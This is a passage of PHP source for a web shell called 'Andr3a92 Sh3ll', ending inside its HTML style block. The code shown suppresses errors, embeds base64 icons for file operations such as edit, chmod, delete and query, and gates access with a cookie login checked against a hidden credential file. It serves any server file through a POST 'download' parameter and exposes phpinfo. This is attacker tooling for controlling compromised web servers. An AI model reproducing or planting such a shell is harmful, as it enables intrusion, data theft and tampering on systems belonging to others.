<?php
ob_start();
@closelog();
set_time_limit(0);
error_reporting(0);
if(get_magic_quotes_gpc()) $strip_all = true;
else $strip_all = false;
if($_GET['img'] != "") get_img($_GET['img']);
/*img func*/
function get_img($img){
	$images = array(
		"file" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAMZJREFUeNpi/P//PwMlgAWXRFdXFz6Tg8vKytbhNACm2cPDg0FPTw+b/FogxQhiM2HTDNIIA9+/f2f4+vUrw+fPnxk+fPiAYRgTNs1AW7fAxP7+/YuCcYYBzNk7duwAYR9paemXQK44SNO/f/8YYDTeQER2OkizgoICw58/f+CaCRoACjCQX2GKf//+jaIZrxeQ/YysAZ1NtAG4DCLKAFyaiTIAFGi4NJPtBZINwKYZlOmIMgAU9+TmRj9gatxEpD4/GAMgwAAmB/m2aUdLLwAAAABJRU5ErkJggg==",
		"zip" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAVBJREFUeNqkU7FKxEAQnT3yAf6Bhb2lqJyQL7ERTtDjehEsBGMvgVOuUb8khWIriKWFXQgh5EJCquwzM7uJJoVb3IYwMzvzZt7O7igAtMnybhdHnW5zgVhalS22FTv7PatznNeBz2fH4tjaPaXs/Z60DWS5XD1zrBqDWfe6yuHDE12Gr2Iopej67LAP6omNwBxKN/MptNZomsb4zEFQ1zWqqkJZliiKAnmeI8sypGmKJEkQxzEuTvbg2dS0/lgNmrP+fKQ2sVTT9ihtHdGhzR7TmeDPWaMoEvosXeDWLf4J8zXBIN/3KQgCkS6w2O03oREDXsLABTZNZAbo6XJlXixdYHPNtgecgP8BAydYLosT/NIZMvgfjHETOeD7LZQEXy93bjCZRyVNNAmItg/mkmBnunCCtZ1BdTXb7y6iPwrMFPU6rD4YNPNsldp0nH8EGACCB9wmUHUlHQAAAABJRU5ErkJggg==",
		"rename" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAYJJREFUeNqUU89LAlEQnn27BMKyNzsmnvYP6FJ3b0XgPei2Ed4M6yheJFaDiPWgB5GIrkHU/9Cha+YmQkpQ2SVEZV3E15uBt2j+SAeGj5l533zzfimcc1jC1oXvCt+w9vfSmChd32UEtBTZoFAoFAVYGMscYigUgmg0CrquQ9nJwnncp9rx7Ro1oQaCzGOxGJimOXcEoRyQnz8ZVD8YPL4xUMPhcFGQN1cho313FXj/UYCJCaxVyVIdt8AWHeIi8sHRKYYttoicsXegux2fpQydTgdT91MTjEYjGA6HQexWv8AztwKy7VxRvl6vI7QnJkBiv9+HwWBAcfrkgfD1pU3ks8sKXS2u6/V6VNNUVS25rmtFIhHwfR88zyOUdlN5IsxelIExBpqmQaPRAMMwSsFjcRyH12o1/teazeZUDtfhevngJl6iGN2SyslkkjCXy9G5SAIqJxKJw2BEWRj3fD5ParZt81n1cZ95jVhA5VQqpfz3y+Y2WIaMpiz5nefarwADACQFMs6fhMd+AAAAAElFTkSuQmCC",
		"copy" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAUJJREFUeNqckj2Kg1AQxyebrQNWHsBSLCQgiJaiZzEH8A56gBXvYCtoLfZ2KUwsPEM+/HYzj/h2JWogAw/GefN+/5lxNrZtmxzH/cCKnc/ng2VZ7uyl7/vDO3vmwNz5XlI9nU7Uv16vi9VRQJIkNMiyLKRpCnme05jjOMPMe3exAnz86HttNAg1v+BDw/4nLSiKQi+PxyP1oyiivmEY9FtV1dcZILXrOmAYZlFZ13W43+9wu92mAFmWoa5rqKoKsixbLDsIAiKy3+//ABiI4xjatiX+breblD3a5XIBSZKoEAWUZQmCIJAgXhZF8TIDhDdNQwT6vif5BIBrGobhZJX/L46mabRnjKMIQhBIAM8dd2f+8YBJDzhJHg+qo/E8Px3inKGiKIpEHavAVhGw3W4paA3gep5nvtkndzNu1Kf2K8AAAxf9KklDG6EAAAAASUVORK5CYII=",
		"download" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAZBJREFUeNqckz1LxEAQhmeTNGIjWliJIKKltWCjWAgWWihW1hYHgthb2Fmo1aE2dld5wtlZCFoINv4C/8EVnk0u2a8k7jvJHmejOQeGbDLvM7s7MxFFUdD5Taegf9jxwbYQZ812sbyyTr3PLm2tLtQCH54/aHJqmt5enyjIsoyMsWSNqQVDDy0YrKPMWveinZs/QWi0LrVgwEbIhI/wYcvznIW8oxPCsYZ7PdgImZSCK0JBEcC63MUwiGRwb4iDARtBxB8cmCQJpWlKUkpO5HdFYlgQBBSGIWv9JpHmBJKUg65bL7VbCEZzApdNSkVj4xMjzQAYsJHR5Qm8fbl5+M3iuM/Pmdk5Ajs4AcO9LjX210gIwQ7D/X0NUMgrd81+HA9OEKCSWit2FAZ2enlHt/fvg+rDfft8B6Avu+Aq7UFdtbIUKQbxbnnYypbqKsZdwCDZaro4gXsC8oNiq+R+oIaHiOPoQqd1ITb3Dov5xSVuC6CTo10Wx3xX+WMWdDVg7E4rfGBjpzHyL/3YbopvAQYALTKvvIqUmbwAAAAASUVORK5CYII=",
		"edit" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAXVJREFUeNpi/P//PwMlgAWbYFdXFz5Tg8vKytbhNACm2cPDg0FPTw+b4WuBFCOMz4SuGaQRBr5//87w9etXhs+fPzN8/PgRLGZtbQ2iGoA4CYjFmNA1A23dAhP7+/cvGP/794+BhQXi2IXTOxnSYvzqgUw5IPZhBAUiup+lpaVf6urqisvLy4P5zMzMDIyMjAyF6ZEMvYG/wGLF69kYZi3Z1AgPA2SnA4G4goIC2GZsmq++YGKwUPgHdgncAFCAgfwK0gTCIKfj0owMUHgwP4O8BdLMxMTEUJQRhaH52nMmhhMPmMBewGoAzGZCmoHcRyzYDODg4GAozoxmaOzyZvgCFH+4fiNWzUC8BcUFf/78gUcbDNy89pLhh7oFXHN8ZjkDTDMQv8LqhV+/IM6uL9sKpm9dfwWzmeHTp08MMM0YSRlmACg2YGDZgjNgurl3Npi+e/cuA0wzhgGguIcBkG3YwLdv37DmRj9gatxEZA72Q+YABBgA8tbVrRni9E4AAAAASUVORK5CYII=",
		"delete" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAT5JREFUeNqUU0uKhDAQjUOvBBFRXIjgTr2Al+hzeAbPIC5cuBahL9FX8A4uXIgIIohL/5lJoCRmtIcJFFUvqXr18hMwxuhuRFGEi6JAtm2jIAiEq5yvu2Lf9ylzmqYCi/khsAqyLMPbtqF1Xakty0L9PM80BkwsjmPhRPB6vbDneTRpmqbDxnGkBjHxhLAsS5QkifCA7oQoz3MECqAjSWYxKIDGpy2EYYhd1z0kE08MugJZVVXH2ZwOUVVVZJrmgR3HOTpZlkXXFUVBoihe3wJJ3vcdGYZxYF3X6Rxg/tp/EQAJGcSzRTy+VQAJPGZJLglgkdwEq4hX8PElgnyIeUUftwAFrAKY+xcB25H3f26hrmtKIkkS6vuexpqmoa7raPEwDCeSB1v880Debds+m6Y5fSj2CROTZfkNNd8CDABg938S/VLKaAAAAABJRU5ErkJggg==",
		"chmod" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAATdJREFUeNqUk81Kw0AUhc/ExKYxTaWJFl0oiLh148onER9QxDcQXAuCO8VV8QdXSptFWk3z04x3pjaMtGaSC4E7N/nOnLk3wzjnaBLPl+clcHB2wYymsHfYJ/C0rBnNYJ+ygvLbsm7WhzcRnOxQ/iit13Yg4f0OguOAVvnSe1ML7zoIjroY3n8gehvXFxCwu2Uj2HOBZCZh1fqSgDoeEe2eBadvI0tnsCpcmgvY7mZwtwswg0psnR5qD88xfI0Rh8n/AhLuxNjwYwIs8GLOihC5gFdZ/+PA6Y1ovATjd2NFRBdS4GvkIZl4smB7CR0lVUTWKgXkJwK+vktxdRNiGrUIzsiGEMm1Dkqjg5d3PDwN5gsSECKTT/05mLiN6ghbbkQNjfAd+piO25UNLAVW/QeL66pz8CPAAH98jVpFKupbAAAAAElFTkSuQmCC",
		"dir" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAALGOfPtRkwAAACBjSFJNAAB6JQAAgIMAAPn/AACA6QAAdTAAAOpgAAA6mAAAF2+SX8VGAAABKklEQVR4nGL8//8/AyUAIIBY2vNsYWyoWf8ZQDSUCeKB+IwgSbgYlA1SBxBALDDN2WlxYInff/4xMDMxMvyDKgTR02cvAqllRNcMYgMEEAvM5onTF2A47z+SBrBD0DSDXAYQQCwgTuWkQww/f/7EMODfv38QVwBpbHhitd9/gABigRrN8PEqpgsgBgBpqFf+/fsPZv//BxEDOQcggJhgziFVM1AaLA8QQEz/oYqZmUjTDOYDIUAAMTEghTZJmiGByAAQQEwgU+CaSNAMiWYGBoAAYoJpJF0zOEIZAAKI6T+Sc0jR/B8aiAABBA9EkjUzQBIVQACxMMC8ANUMSsqI2MCtGRboAAEETIn/GXvLPP4jJU+I2dBA+g/LXOgZDZIHGAECiJHS7AwQYAAgis2oJMDmgwAAAABJRU5ErkJggg==",
		"blank" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAADAFBMVEX///8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALI7fhAAAAAXRSTlMAQObYZgAAAAlwSFlzAAALEgAACxIB0t1+/AAAAA1JREFUeNpjYBgFyAAAARAAAX/NA7UAAAAASUVORK5CYII=",
		"refresh" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAI/SURBVDjLjZPbS9NhHMYH+zNidtCSQrqwQtY5y2QtT2QGrTZf13TkoYFlzsWa/tzcoR3cSc2xYUlGJfzAaIRltY0N12H5I+jaOxG8De+evhtdOP1hu3hv3sPzPO/z4SsBIPnfuvG8cbBlWiEVO5OUItA0VS8oxi9EdhXo+6yV3V3UGHRvVXHNfNv6zRfNuBZVoiFcB/3LdnQ8U+Gk+bhPVKB3qUOuf6/muaQR/qwDkZ9BRFdCmMr5EPz6BN7lMYylLGgNNaKqt3K0SKDnQ7us690t3rNsxeyvaUz+8OJpzo/QNzd8WTtcaQ7WlBmPvxhx1V2Pg7oDziIBimwwf3qAGWESkVwQ7owNujk1ztvk+cg4NnAUTT4FrrjqUKHdF9jxBfXr1rgjaSk4OlMcLrnOrJ7latxbL1V2lgvlbG9MtMTrMw1r1PImtfyn1n5q47TlBLf90n5NmalMtUdKZoyQMkLKlIGLjMyYhFpmlz3nGEVmFJlRZNaf7pIaEndM24XIjCOzjX9mm2S2JsqdkMYIqbB1j5C6yWzVk7YRFTsGFu7l+4nveExIA9aMCcOJh6DIoMigyOh+o4UryRWQOtIjaJtoziM1FD0mpE4uZcTc72gBaUyYKEI6khgqINXO3saR7kM8IZUVCRDS0Ucf+xFbCReQhr97MZ51wpWxYnhpCD3zOrT4lTisr+AJqVx0Fiiyr4/vhP4VyyMFIUWNqRrV96vWKXKckBoIqWzXYcoPDrUslDJoopuEVEpIB0sR+AuErIiZ6OqMKAAAAABJRU5ErkJggg==",
		"lock" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAgBJREFUeNp0Ur9v01AQ/p7T2rGDQ0Wabhn4A9iQipBA/ANZok5R/wSYI8VLVMGIEBviD0ikMKGIFYkRFqRKsLAkqIPjhqqJ7VIh2493519pqpz0dGe/+767++4JKSU2bTweS/pvmiaSJAHFdDqdjtjMFZsEBI7juADlh4hc10Wv1xNbCQgcRRHH0+mUPQGJsNVqcex5Hvr9fkGys85GYCIksOM4NyoNh0MZhiGTrJuWB6PRSNLlbDa7BSbrdrvCMAw0Gg0MBgN5i4Au81m3WT7Oek4xAglEBJqmbSWYz+ecI4S4KeKH3lNpm4b6pEsgJuWL9dFv5VGKTfBlcI3jt9/EzmQyOXzw7D4OmvtIJIHS9mTCSETxP0WqcVyslVbqnacatNtt7OomdKOmdLiDqmGrMSrQKhX4wQLOmy/w/QUq2i7Mah2WeRdWbU/5eiHi1zC8RBhcIAz/IAgXWaUEL9995xFevT/l7lYrD8ulmx4V5wSHpmKzLGLdQ826x2ACnrx4zGQnzx/xCLa9D7veVL6JuvJlB6q6H5xzy1SF5ndef4auW0ygGxaTLldu2cGlW27hx6djedBsZIqnIibsZTEOC5uJSIkk4sOjj4LfQXB2jerVVZpI90iyxBSUE5WblPh7EZUP6dfP33CteVEpJZF5mHaG7E1k5qt38ET5/wIMAFY+ZmpX9X6bAAAAAElFTkSuQmCC",
		"unlock" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAgFJREFUeNqUUkGL01AQ/pLuJk1q6qLbvfUgnr0JK4LiHyhC8VQW+gf0XGhuix5FvIk/oIV60uJV8Lh4EITdi5dWPMRsXbZNshZJ8nwzL3mtlT048JjJ5H3fzHzzDCEENm00GgnKO46DPM9BMZ12u21s3jU2CQicZZkGlYeIgiBAr9czLiUgcJqmHE8mE/YEJMJms8lxGIbo9/uaZGudjcBESGDf9/+qNBgMRJIk9H+5njfLYDgcCqownU7/AZN1Oh3Dsqx3nufdXM/rDmzbBlUgksus2+0+3MxpAhKI2jdNE/9jLOKb3n3hObb8FDBk8xkpr9dHaemhxC5Fj5IlDl5+MrbG4/H+rQc3sNfYRS4IpEYQOSORZr8lqcmxXiutNDxVIrZaLWxbDiy7JnW4gqrtyTEqMCsVRPEM/ouPiKIZKuY2nGodrnMVbm1H+rrewlGSnCOJz6SIPxEns6JSjqevPvMIz15/4e4WixDzeaCOjEuCfUeyuS6x7qDmXmMwAQ+f3GWyw8d3eATP24VXb0jfQF36VQeyehSfcstUheb3n3+AZblMYNkuk84XwaqD82C1heP3B2Kvcb1QXImYsxd6nHIDvAV5SMTbj94a/A7i70tULy7URfqPvLhYrk3ob2UCv87S1UP6evINgftDV1IkogxVZyjeRGFRvMQ96f8IMAB7zVtQdBVN2wAAAABJRU5ErkJggg==",
		"truncate" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAXpJREFUeNpi/P//PwMlgAWbYFdXFz5Tg8vKytbhNACm2cPDg0FPTw+b4WuBFCOMz4SuGaQRBr5//87w9etXhs+fPzN8+PABq3OY0DUDbd0CE/v79y8YMzExMbCzsyPr8wbiBhDNCApEdD9LS0u/1NXVFZeXl2f49+8f2JDXKXEMmhu2gdQyRF48yfjl6/f/PNycjPAwQHY6EIgrKCgw/PnzB6z5TWo8WPB6gBcDg5UDA0jz6x8/GID4P9wAUICB/AqyEYR///4N1gxi80+bw/AxKwWszvfYAZBGMFtRWJARJRBhfgZhmO0wNueEaXB1ohwcYM0YsYBNMysrKwMfHx/D94IsuM0gAPIGVgPQbQYZ8DwhCq75XWk1mAbx7799/x/FAHTNIBqUFsTmLgbL2+3Yx/DixQtQbDTCwoAF3QWwaIMF5qdPnxi4uLgYNBatAKu5e/cuiDoNNIyRoBdgGGQIyGYksBVrXgDFPbm50Q+YwjYRqccPmQMQYADmggiJk1rTdQAAAABJRU5ErkJggg==",
		"query" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAlVJREFUeNp8U0trWlEQHq/1LfhWfEXEhYuuSnRjFwrNSiG4LcFVtnbRZbsJXRWyKmRREPIXhGQVMP4ADe4KEhJ8gaL4AJ9R46PfSK54KXRguHPnnPnmm8eRbbdbEqVUKh0tl8vz+Xz+abFYBGGbBUEYKBSKR2heLpdfR6PRBh2ITAQoFotns9nsq16vPzabzWQwGEitVhN8NBgMqNPp0HQ6rWm12kuA/JYAFAqFM2T94XK5Ah6PhzabDbF/vV7TIcNqtUrNZnOKBFeRSOQb++SJROJoMpn8crvd771eL61Wqx0AB/NXtFmZFc6V7Xb7A/6rdrv9j4Baz3U63TFn/l8wn6EnxEnQC123272o1+s2gRtmsVgkl9lm393d3d4ngry+vpLD4aBerxeE71R4eXkJvlGTZGVJpVKUTqclIAxgNBoJDPj/hBmYVSqV5JIIwJLNZsnn80lYYBI0Go04WViQyWQDjEdSwiFAMpmkp6enfWk8FQ7mEcPnewd57Pf7VnRU0jyWTCZDsVhsP072o4E7+lw2/HUGyLdarY8McDgBziqCicogSqWSGo0GWa1W9j1gU4Xr4XBYq1QqBPufaRzaWGd6fn4mNJ7eGN8L8Xi8odFoLjHTKYOA0Q6IRczKtLnRfF6r1cjv9/O9G5zf7t9CLpf7iX3/gos6p9NJJpOJsGA0Ho93NTNtTIwCgQBhlYuI+x4KhfKyw13Hm/iMh3PBSwLddRvsOIBsNtuONsq4QcxVOBzOS16jKOVy2QZqp9ATnIXx9UHrsB+g99BbBHfF+38FGACEB/w/R/hNqQAAAABJRU5ErkJggg==",
		"logout" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACPklEQVR42mNkoBAwni43+k+sYtPOc4xYDWARlWL4+O3nfdfG3Rkgwd9/GT4BqW9Q/AWIPwLVfcNqwKkyw//f/jExaNi5MNx+8+uAU2p/OzYDfHqEvm3hfcfAkM6AYghjd1naf+NfJxmkJQQYRM29GFYsXnYga97FShQDpjD0MLAyRIN1oBtwosTg/5df/xikRLgYuOU0GdqmbWaYeeqNJdyAFgZvBlGGCW3mLQxVJ2swA/FYkT7YAEmgAbwKugzt0zYgDKhm8GSQY+hoMmtg+PT7I8Off78ZeFi5GdiY2Rne/HzFMGnVDAbGwwW6EAOEORm4ZTQYeubuQBgwk+Fig2kdw7FXRxi+/vnCwMnCwcABxNysXAzinGIMk1bOYmA8mKvz//PPv2ADOCSUGCYtPYDhgmj1cIYvfz4z8LPzMXAAbedgYWfgZ+NnaF7czcC4L0vr/0eQAYIcDOeYtBkevvzC0LlwE0YYFBhkM0xYNRUzDDqKU/4rvT7AIAE04Ol/EYbdd34yzNt23BJrLNwC8nrRYmF7iur/91//MIgDDWDlFWJYvO8Gw+zTb1ENAKYDl1a+b3vefcI0YHOC8v+3X34ziAuwM7By8TKsO/WIYdqJNxgGANV9811wFzMlgoj5QTKXhXhYdZjZOBh2Xn3DMPn4a31QigbiX0j0Wygb04A5ATJKPBzMZznZWQQO3v3M0HfklQtU8R8gfgPEj4D4B9bcCGMsDJYN4GRjXn/++XeG9gMvI6DOvwLE9/HlUABUQ/ZxJnFQUAAAAABJRU5ErkJggg==",
		"favicon1" => "AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAAAABELAAARCwAAAAAAAAAAAAAEAAAnAAAAIgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWQcHeTQSEtABAABJAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAG0BAQpjDAyCQBUT4QQkAqccGQRwajoQjEcoBYkAAAA9AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB42EZgopEf/No4t/9+zd//xsHL/klkb2gYAAFYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAzRwc9L6U5+hCuQf87lj7/6MKa//O1eP+TXCHcDgQAVAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1HoYI8+xe/pNt23/NZg9/+LAmf/twZr/9seX/6pvMOgbCwBsAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAO6HFhPwuH3f+PPv/+zXvf/sx6L/7cqo/+/Stf/2yp//vX898ysWAIUAAAATAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA540VWO3Gn//24c//89vD//Tgy//w07f/7cyr//TKn//NikL6NxoAnQAAACsAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADhjSpZ676K7/Ti0P/jq3b/68Wg/+/Ttf/rxqD/7b6P/9eQUf9VLwepAAAABwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOqHGjLejjnM5riS//DStv/pvJD/6sKc/+i+kv/ruIn/sXE/8h4IAHcAAAARAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA6pQhFuemO6Xfomz/5bGA/+vFoP/ou47/6LqO/8KFXf+AMgn4EAYAXwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADypw4K4pdErevLrP/rxqT/6cCX/+a7kv/DbyH/tVIG/z4XAIQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOWNKhjenVHI6b6Q/+nDmf/hpGH/34wt/89zHv8qDwBXAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA55cqBsV5I0TSciXD77Jq//OtZP6FQxCmAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA2TEAB6xaCVZXKQVDBgEAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//8AAL//hv+J/8jpwP/67uB/1uXgP6TS4A+L0vAHbsz4A4zh/AOO//4BAAL/AAAA/4EAAP/hAAD//wAA//8AAA==",
		"favicon2" => "AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAAAAPAKAADwCgAAAAAAAAAAAAAAAAAAAAAAAAAAACMFAwM/AQEBNwAAABkAAAADAAAABwAAAAMCAQEgCAUFSwYEBEMAAAAxAAAAHAAAAAIAAAAAAAAAAGhNTW6cdnbflGdn7ophYedxTk7SY0dHs4JjY7pjRka1l25u3LqLi/eZbW3uoXl55INhYdUQCgpZAAAAAAAAAADYrq7i/+/v//LR0f/iubn/4rOz//7R0f//3Nz//9DQ/+y3t//hra3/77q6//3Hx//nsLD/NSQkegAAAAAAAAAAz6ioqv/y8v//8PD//+np//fT0//92dn//9vb///W1v/8zMz/9cLC//fExP/3w8P/vpCQ8QkGBjkAAAAAAAAAAMyiol799vb///b2///x8f/22tr/+tzc///j4///29v//tPT//fFxf/5xsb//MjI/5Nubs0AAAAQAAAAAAAAAADasLAr7d7e+v///////Pz/++vr//rj4///6ur//+Li///a2v/6zc3//svL//vFxf9kSUmrAAAAAAAAAAAAAAAA04uLBuLCwtH///////////329v/66+v///Ly///q6v//4OD//NPT///R0f/yvr7/QzAwgwAAAAAAAAAAAAAAAAAAAADcuLiU/////////////f3//fX1///6+v/+7u7//+fn//7a2v//19f/4rGx/yQZGWIAAAAAAAAAAAAAAAAAAAAAln5+dv/+/v/Uu7v/7dra///////XxMT/06+v//3m5v//4+P//9vb/9apqf4MCQlTAAAAAAAAAAAAAAAAAAAAAN21tWfs5eX/pISE/8qsrP/y7Oz/ooeH/7CMjP/hxcX//+rq///f3//LoKDwBgMDPQAAAAAAAAAAAAAAAAAAAADvsrJS4tnZ/4VwcP+hior/5Nra/4Nvb/+NcnL/xK2t///v7///4+P/tJCQ3gEAAB8AAAAAAAAAAAAAAAAAAAAA94SEMu7a2v5zY2P/e25u//Dn5/96aGj/X1BQ/8u8vP//8fH//+Tk/4NlZbMAAAAEAAAAAAAAAAAAAAAAAAAAAP/5+Qn/5ubOybq6/7yysv//////w7Cw/5iKiv/78fH///Hx/+vGxvsmGhpLAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAn4ODTv/29v///////////////////v7///r6///r6/95X1+UAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD4xMRo9+Tk8f////////////////Te3viGaWmJBQICCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPK3tye9nJxke3R0fXhoaHVQODg0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//8AAMADhv+AA8jpgAP67sAD1uXAA6TSwAOL0sAHbszgB4zh4AeO/+AHAALgBwAA4A8AAPAPAAD4HwAA//8AAA=="
	);
	header("Content-type: image/gif");
	header("Cache-control: public");
	echo base64_decode($images[$img]);
	die();
}

if(is_file(md5('andr3a92'))){
	if(!isset($_COOKIE['shell_username']) || !isset($_COOKIE['shell_password'])){
		if(!isset($_POST['login'])){
			echo '<form action="" method="POST">Username: <input type="text" name="username"><br>Password: <input type="password" name="password"><br><input type="submit" value="Login" name="login"></form>';
			die();
		}
		else{
			$fp = file(md5('andr3a92'));
			$fp = explode('::::',$fp[count($fp)-2]);
			$username = trim($fp[0]);
			$password = trim($fp[1]);
			if(md5(md5(strtolower($_POST['username'])).'andr3a92') == $username && md5(md5($_POST['password']).'andr3a92') == $password){
				setcookie('shell_username',md5(sha1(md5(sha1(md5(sha1(base64_encode($username))))))),time() + 60*60*24,"/");
				setcookie('shell_password',md5(sha1(md5(sha1(md5(sha1(base64_encode($password))))))),time() + 60*60*24,"/");
			}
			else{
				echo '<font color="red" size="5">USERNAME AND/OR PASSWORD WRONG!</font>';
				die();
			}
		}
	}
	else{
		$fp = file(md5('andr3a92'));
		$fp = explode('::::',$fp[count($fp)-2]);
		$username = trim($fp[0]);
		$password = trim($fp[1]);
		if(($_COOKIE['shell_username'] != md5(sha1(md5(sha1(md5(sha1(base64_encode($username)))))))) || ($_COOKIE['shell_password'] != md5(sha1(md5(sha1(md5(sha1(base64_encode($password))))))))){
			setcookie("shell_username","",time() - 3600,"/");
			setcookie("shell_password","",time() - 3600,"/");
			header("refresh: 1");
			die('Access denied!');
		}
	}
}

if($_POST['download'] != ""){
	$download = $_POST['download'];
	if(strpos($download,"/") !== FALSE){
		$download_name = explode("/",$download);
		$download_name = $download_name[count($download_name)-1];
	}
	elseif(strpos($download,"\\") !== FALSE){
		$download_name = explode("\\",$download);
		$download_name = $download_name[count($download_name)-1];
	}
	else $file_name = $download;
	if(is_file($download)) download($download);
	else die("404 not found!");
}

if($_POST['phpinfo'] == "view"){
	echo "<center><form action=\"".$_SERVER['PHP_SELF']."\" method=\"POST\" name=\"return\"><input type=\"hidden\" name=\"dir\" value=\"".htmlspecialchars($_POST['dir'])."\">
	<a href=\"#\" onclick=\"document.return.submit()\">Return to Andr3a92 Sh3ll</a></center></form><br><br>";
	phpinfo();
	die();
}

?>
<html>
<head>
<link rel="shortcut icon" href="<?php echo $shell."?img=favicon1"; ?>">
<title>
~ Andr3a92 ~ Sh3ll ~
</title>
<style type="text/css">
a:link{
